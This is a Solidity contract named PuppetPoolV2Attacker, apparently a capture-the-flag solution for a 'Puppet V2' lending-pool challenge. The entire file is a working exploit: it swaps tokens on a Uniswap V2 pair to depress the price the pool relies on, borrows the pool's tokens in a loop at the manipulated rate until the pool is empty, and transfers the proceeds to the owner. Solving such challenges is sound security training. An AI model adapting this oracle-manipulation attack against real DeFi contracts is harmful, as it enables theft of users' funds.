// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import {PuppetV2Pool} from "./PuppetV2Pool.sol";

import {IWETH} from "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {UniswapV2Router02, IERC20} from "@uniswap/v2-periphery/contracts/UniswapV2Router02.sol";

contract PuppetPoolV2Attacker {
    address owner;
    address uniswapRouter;
    address uniswapPair;
    address puppetV2Pool;
    address token;
    address weth;
    uint256 counter;

    constructor(
        address _owner,
        address _uniswapRouter,
        address _uniswapPair,
        address _puppetV2Pool,
        address _token,
        address _weth
    ) public {
        owner = _owner;

        uniswapRouter = _uniswapRouter;
        uniswapPair = _uniswapPair;
        puppetV2Pool = _puppetV2Pool;
        token = _token;
        weth = _weth;
    }

    function attack() external payable {
        IWETH(weth).deposit{value: address(this).balance}();

        IERC20(token).approve(uniswapRouter, type(uint256).max);
        IERC20(weth).approve(uniswapRouter, type(uint256).max);
        IERC20(weth).approve(puppetV2Pool, type(uint256).max);

        while (IERC20(token).balanceOf(puppetV2Pool) > 0) {
            uint256 poolTokenBalance = IERC20(token).balanceOf(puppetV2Pool);
            uint256 amountEtherRequireToDrainPool = PuppetV2Pool(puppetV2Pool)
                .calculateDepositOfWETHRequired(poolTokenBalance);

            uint256 currentTokenBalanceOfThis = IERC20(token).balanceOf(
                address(this)
            );

            //swap token -> WETH
            address[] memory path = new address[](2);
            path[0] = token;
            path[1] = weth;
            UniswapV2Router02(payable(uniswapRouter)).swapExactTokensForTokens(
                currentTokenBalanceOfThis,
                1,
                path,
                address(this),
                block.timestamp
            );

            //if we can drain it all, drain it all
            if (
                IERC20(weth).balanceOf(address(this)) >=
                amountEtherRequireToDrainPool
            ) {
                PuppetV2Pool(puppetV2Pool).borrow(poolTokenBalance);
            } else {
                uint256 amountToken = (IERC20(weth).balanceOf(address(this)) *
                    poolTokenBalance) / amountEtherRequireToDrainPool;

                //borrow
                PuppetV2Pool(puppetV2Pool).borrow(amountToken);
            }

            counter++;
        }
        //swap WETH -> token
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = token;
        UniswapV2Router02(payable(uniswapRouter)).swapExactTokensForTokens(
            IERC20(weth).balanceOf(address(this)),
            1,
            path,
            address(this),
            block.timestamp
        );

        //transfer token to player
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    receive() external payable {}
}
